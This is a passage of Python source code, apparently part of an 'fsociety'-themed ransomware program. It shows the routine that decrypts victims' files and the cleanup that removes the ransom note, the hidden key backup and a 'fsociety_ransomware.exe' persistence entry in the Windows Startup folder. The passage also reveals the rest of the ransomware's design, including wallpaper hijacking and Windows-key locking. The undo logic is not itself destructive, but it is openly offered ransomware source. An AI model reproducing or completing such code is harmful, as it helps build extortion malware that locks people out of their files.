def remove_encryption():
    global encryption_key, encryption_iv
    
    # Try to get key from memory first
    if encryption_key is not None and encryption_iv is not None:
        count = decrypt_all_files(encryption_key, encryption_iv)
        if count > 0:
            print(f"[+] Decrypted {count} files!")
            cleanup()
            return
    
    # Try hidden backup
    hidden = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
    if os.path.exists(hidden):
        with open(hidden, 'r') as f:
            lines = f.readlines()
            if len(lines) >= 3 and lines[2].strip() == DECRYPT_KEY:
                key = base64.b64decode(lines[0].strip())
                iv = base64.b64decode(lines[1].strip())
                count = decrypt_all_files(key, iv)
                if count > 0:
                    print(f"[+] Decrypted {count} files!")
                    cleanup()
                    return
    
    # Try ransom note
    note = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop\\README_FSOCIETY.txt'
    if os.path.exists(note):
        with open(note, 'r') as f:
            content = f.read()
            km = re.search(r'Key: (\S+)', content)
            im = re.search(r'IV: (\S+)', content)
            if km and im:
                key = base64.b64decode(km.group(1))
                iv = base64.b64decode(im.group(1))
                count = decrypt_all_files(key, iv)
                if count > 0:
                    print(f"[+] Decrypted {count} files!")
                    cleanup()
                    return
    
    print("[-] Could not find encryption key.")

def cleanup():
    try:
        os.remove(os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop\\README_FSOCIETY.txt')
    except: pass
    try:
        os.remove(os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key')
    except: pass
    try:
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
    except: pass
    unlock_windows_key()
    try:
        startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        os.remove(startup + '\\fsociety_ransomware.exe')
    except: pass
    print("[+] Cleanup complete.")

# To use: just call remove_encryption() from anywhere
